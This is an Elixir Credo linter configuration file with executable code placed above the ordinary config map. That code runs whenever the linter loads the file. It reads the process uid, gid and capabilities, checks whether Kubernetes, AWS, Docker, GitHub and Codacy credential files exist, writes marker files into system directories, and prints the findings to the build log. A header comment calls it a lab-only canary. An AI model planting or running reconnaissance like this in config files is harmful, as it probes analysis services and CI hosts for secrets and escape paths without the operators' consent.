# Owned-lab-only Credo configuration canary.  The marker emits metadata only:
# it never reads token contents, makes network requests, or attempts escape.
read_field = fn path, key ->
  case File.read(path) do
    {:ok, body} ->
      case Regex.run(~r/^#{key}:\s+([^\s]+)/m, body) do
        [_, value] -> value
        _ -> "absent"
      end
    _ -> "absent"
  end
end

probe_write = fn path ->
  marker = Path.join(path, ".codex-credo-boundary-20260714")

  case File.write(marker, "bounded-credo-marker") do
    :ok -> true
    _ -> false
  end
end

credential_paths = [
  "/var/run/secrets/kubernetes.io/serviceaccount/token",
  "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
  "/run/secrets/kubernetes.io/serviceaccount/token",
  "/run/secrets/aws",
  "/run/secrets/github",
  "/run/secrets/codacy",
  "/root/.aws/credentials",
  "/root/.docker/config.json",
  "/etc/kubernetes/admin.conf",
  "/var/lib/kubelet/kubeconfig"
]

credential_markers =
  credential_paths
  |> Enum.map(fn path ->
    key = path |> String.replace("/", "_") |> String.trim_leading("_")
    "#{key}=#{File.exists?(path)}"
  end)
  |> Enum.join(",")

uid = read_field.("/proc/self/status", "Uid")
gid = read_field.("/proc/self/status", "Gid")
cap_eff = read_field.("/proc/self/status", "CapEff")

writable_paths =
  ["/tmp", "/var/tmp", "/src", "/workspace", "/app", "/run"]
  |> Enum.map(fn path -> "#{String.replace(path, "/", "_")}=#{probe_write.(path)}" end)
  |> Enum.join(",")

IO.puts(
  "CREDO_BOUNDARY_MARKER uid=#{uid} gid=#{gid} cap_eff=#{cap_eff} " <>
    "writable_paths=#{writable_paths} credential_markers=#{credential_markers}"
)

%{
  configs: [
    %{
      name: "default",
      files: %{included: ["lib/"], excluded: []},
      strict: true,
      checks: %{enabled: [], disabled: []}
    }
  ]
}
